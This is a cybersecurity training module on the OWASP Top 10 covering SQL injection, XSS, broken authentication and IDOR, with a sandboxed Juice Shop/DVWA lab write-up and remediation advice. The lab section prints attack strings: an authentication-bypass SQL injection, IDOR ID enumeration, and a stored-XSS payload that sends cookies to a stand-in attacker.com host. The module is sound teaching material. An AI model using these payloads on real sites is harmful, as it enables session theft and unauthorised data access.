# Day 15: The OWASP Top 10

## Web Application Vulnerability Architecture
* **The Core Shift:** While network-level scanning looks for unpatched background daemons, protocol version regressions, or unlocked hardware communication ports, web application security focuses entirely on logical flaws embedded within the source code and input parameter handling blocks of Layer 7 application software.
* **The OWASP Mission:** The Open Web Application Security Project (OWASP) is an international non-profit foundation that compiles the **OWASP Top 10**—a peer-reviewed, industry-standard consensus reference index detailing the ten most critical, real-world security risks facing modern web software applications.

---

## Dissecting 4 Core OWASP Flaws & Injection Mechanics

### 1. SQL Injection (SQLi)
* **The Underlying Flaw:** Occurs when an application takes untrusted, unvalidated input directly from a browser parameter and appends it straight into a dynamic database query string without prior sanitization or parameterization.
* **The Exploitation Mechanism:** An attacker inputs structural database characters (like single quotes `'` or boolean operators `OR 1=1`) into form fields or URL inputs to change the program's logical execution path.
* **The Danger Level:** Allows external threat actors to completely bypass authentication panels, read confidential records, exfiltrate whole backend user databases, or modify data values.

### 2. Cross-Site Scripting (XSS)
* **The Underlying Flaw:** Occurs when an application accepts malicious, unescaped browser code input and reflects it back into a webpage payload displayed to other visitors.
* **The Exploitation Mechanism:** Instead of inputting normal text data into a comment box or profile field, an attacker inputs active web language scripts (such as `<script>alert(document.cookie)</script>`).
* **The Danger Level:** The script executes silently within the context of an innocent user's local web browser, enabling the attacker to steal operational authentication session cookies, hijack accounts, or redirect traffic to fraudulent phishing clones.

### 3. Broken Authentication
* **The Underlying Flaw:** Flaws in structural access control mechanisms, session token lifecycles, or credential management routines.
* **The Exploitation Mechanism:** Weak password policies that allow brute-forcing, predictable session identifier sequences, or failing to rotate session tokens following account logout boundaries.
* **The Danger Level:** Grants malicious third parties the ability to mimic legitimate user sessions or globally hijack administrative corporate user roles without needing to crack the encryption layer.

### 4. Insecure Direct Object References (IDOR)
* **The Underlying Flaw:** A type of access control failure where an application presents direct horizontal or vertical data identifiers (like database tracking keys or user ID numbers) straight inside visible page structures (such as URL paths) without validating whether the active session holds permission to view that specific record.
* **The Exploitation Mechanism:** An authenticated user alters an ID parameter value visible inside their web browser bar (e.g., changing `://app.com` to `id=1002`) [11-vulnerability-management-and-cvss.md].
* **The Danger Level:** Enables users to view, download, or edit private data blocks belonging to any other user across the database domain simply by guessing numbers [11-vulnerability-management-and-cvss.md].

---

## 💻 Lab Activity: Vulnerability Audit of a Deliberately Vulnerable App
*Note: Lab training metrics were collected by testing logical interface flaws inside isolated, sandboxed application containers (such as **OWASP Juice Shop** or **Damn Vulnerable Web Application - DVWA**) to discover real exploitation points.*

### Vulnerability Finding 1: SQL Injection on Login Page
* **Exploitation String Used:** `' OR 1=1 --` typed into the username credential input field.
* **Observed App Reaction:** The web application immediately bypassed the password verification loop entirely, granting administrative interface panel access to the database container without prompting for a valid security token.
* **Core Vulnerability Lesson:** The single quote `'` broke out of the web query string boundary, and the boolean `OR 1=1` statement forced the SQL parser to evaluate the line as universally true, forcing the authentication loop open.

### Vulnerability Finding 2: Stored Cross-Site Scripting (XSS)
* **Exploitation String Used:** `<script>fetch('http://attacker.com' + document.cookie)</script>` typed inside an app public product review input box.
* **Observed App Reaction:** The review text box saved the raw script payload permanently onto the database. Every subsequent student account browser that navigated to view that specific product page immediately executed the malicious javascript segment silently, dumping session token data out to the remote network handler.
* **Core Vulnerability Lesson:** The web framework failed to sanitize or encode application layer characters before presenting data, allowing user input to convert into executable web browser instructions.

### Vulnerability Finding 3: Insecure Direct Object References (IDOR)
* **Exploitation String Used:** Intercepted web requests to map parameter routing patterns: `http://[Target_IP]/api/v1/users/4` [11-vulnerability-management-and-cvss.md, 12-network-discovery-and-vulnerability-scanning.md]. Changing the trailing index increment digit sequentially to `5`, `6`, and `7` [11-vulnerability-management-and-cvss.md].
* **Observed App Reaction:** The backend API instantly dumped plain-text profiles, email records, and hashed password values belonging to other registered system users, ignoring access check rules [11-vulnerability-management-and-cvss.md].
* **Core Vulnerability Lesson:** The backend logic relied entirely on the obscurity of hidden URLs rather than enforcing strict access control token lookups on the server for each record requested [11-vulnerability-management-and-cvss.md].

---

## Strategic Real-World Defensive Engineering
* **Parameterized Queries (Prepared Statements):** This is the definitive remediation path against SQL Injection. It forces the database database engine to treat user input strictly as a harmless, isolated text string parameter, preventing it from ever being compiled as active database commands.
* **Output Encoding & Sanitization:** The baseline mitigation against XSS. Web engines must automatically convert hazardous characters (like `<` or `>`) into benign HTML entity tags (such as `&lt;` or `&gt;`) before printing them back to a user's browser, preventing execution.
* **The Fallacy of Security by Obscurity:** Assuming an asset is safe merely because its URL path is unlinked or hard to guess is a fatal architectural mistake. Security controls must actively validate session tokens on every single resource request at the server layer.

* ---

## 📝 Assessment Reference & Technical Self-Check

### 1. Grading Focus & Submission Deliverables
* **Format:** Independent Lab Execution & Written Code Vulnerability Worksheet.
* **Milestone:** The practical findings documented inside this module directly feed your **Week 4 MCQ Knowledge Check on Day 4** and serve as the foundational security baseline for your upcoming **Capstone Project Vulnerability Report**.
* **Required Evidence Portfolio:**
  * A completed local sandboxed deployment run of an approved vulnerable application (Juice Shop / DVWA).
  * Written documentation of 3 distinct OWASP findings containing the exact exploitation string used, the observed application reaction, and the technical remediation solution.
  * A professional, 2-to-3 sentence prioritization risk justification explaining which web vulnerability requires urgent emergency patching first.

---

### 🧼 Triage Portfolio Self-Check Verification Checklist
Before committing this file to your public portfolio repository, verify your documentation aligns perfectly with these professional engineering evaluation standards:

* [ ] **No Absolute Worst-Case Guessing:** Are your impact metrics and descriptions based strictly on the actual, documented behavior observed on your screen, rather than worst-case theoretical assumptions?
* [ ] **True Plain-Language Translation:** Are your 1-sentence vulnerability descriptions written fully in your own words? *Test: If you can read your sentence to a non-technical manager or a friend without it sounding like a textbook, it passes.*
* [ ] **Context-Driven Prioritization:** Does your top patching choice look past the raw severity score alone to actively argue based on **Asset Value** (e.g., customer databases vs. test files) and **Exposure** (e.g., public-facing portals vs. internal VPN layers)?
* [ ] **Remediation Precision:** Does your mitigation documentation suggest robust source-code level architecture fixes (like Parameterized Queries or Output Encoding) rather than fragile, easily bypassed regex input character filters?

